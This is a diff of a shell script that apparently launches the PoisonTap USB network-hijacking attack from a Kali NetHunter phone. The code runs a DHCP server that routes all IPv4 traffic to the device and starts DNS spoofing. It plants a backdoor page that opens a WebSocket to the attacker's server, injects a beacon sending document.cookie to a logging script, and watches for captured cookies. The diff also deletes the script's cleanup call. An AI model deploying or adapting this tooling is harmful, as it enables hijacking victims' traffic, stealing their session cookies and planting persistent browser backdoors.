@@ -44,7 +44,7 @@ exit
 # ================== #
 # dependency check function
 dep_check(){
-DEPS=(python git python-pip python-dev screen sqlite3 python-crypto nodejs)
+DEPS=(python git python-pip python-dev screen sqlite3 python-crypto nodejs isc-dhcp-server isc-dhcp-common)
 for i in "${DEPS[@]}"
 do
   PKG_OK=$($chroot_nh /usr/bin/dpkg-query -W --showformat='${Status}\n' ${i}|grep "install ok installed")
@@ -106,7 +106,7 @@ elif [ "$(ifconfig rmnet_data0 | grep inet)" ]; then
 fi
 
 # ================== #
-# Check if usb state is setup correctly before moving forward. 
+# Check if usb state is setup correctly before moving forward.
 # ================== #
 if [ "$(getprop sys.usb.state | grep win)" != "" ] && [ "$(getprop sys.usb.state | grep rndis)" != "" ]; then
     INTERFACE=rndis0
@@ -178,7 +178,7 @@ subnet 0.0.0.0 netmask 128.0.0.0 {
 	option domain-name "local";
 	option domain-name-servers $iface_addr;
 	#option domain-name-servers $(getprop net.dns1);
-# send the routes for both the top and bottom of the IPv4 address space	
+# send the routes for both the top and bottom of the IPv4 address space
     option classless-routes 1,0, 1,0,0,1,  1,128, 1,0,0,1;
     option classless-routes-win 1,0, 1,0,0,1,  1,128, 1,0,0,1;
     #option local-proxy-config "http://$iface_addr/wpad.dat";
@@ -200,7 +200,7 @@ mkdir -p $nh_path/root/logs
 $chroot_nh /usr/sbin/dhcpd -cf /root/poisontap.conf -s $iface_addr
 
 # ================== #
-# Change listening server IP 
+# Change listening server IP
 # ================== #
 echo " [+] Setting server IP: $myserverip"
 sed -i "20c var socket = new WebSocket('ws://$myserverip:1337');" $nh_path/root/poisontap/backdoor.html
@@ -211,7 +211,7 @@ sed -i "4c new Image().src='http://$myserverip/poisontap/log.php?log='+document.
 # ================== #
 echo " [+] Starting 'dnsspoof' & 'nodejs' on Kali environment"
 $chroot_nh /usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i $INTERFACE port 53
-$chroot_nh /usr/bin/screen -dmS node /usr/bin/nodejs /root/poisontap/pi_poisontap.js 
+$chroot_nh /usr/bin/screen -dmS node /usr/bin/nodejs /root/poisontap/pi_poisontap.js
 
 # ================== #
 # Get target's IP and PC name
@@ -252,10 +252,4 @@ if [ $(find /data/local/nhsystem/kali-armhf/root/poisontap/poisontap.cookies.log
 fi
 sleep 1
 done
-# SHUT IT DOWN and Revert everything back to normal!
-shutitdown
-
-
-
-
-
+# SHUT IT DOWN and Revert everything
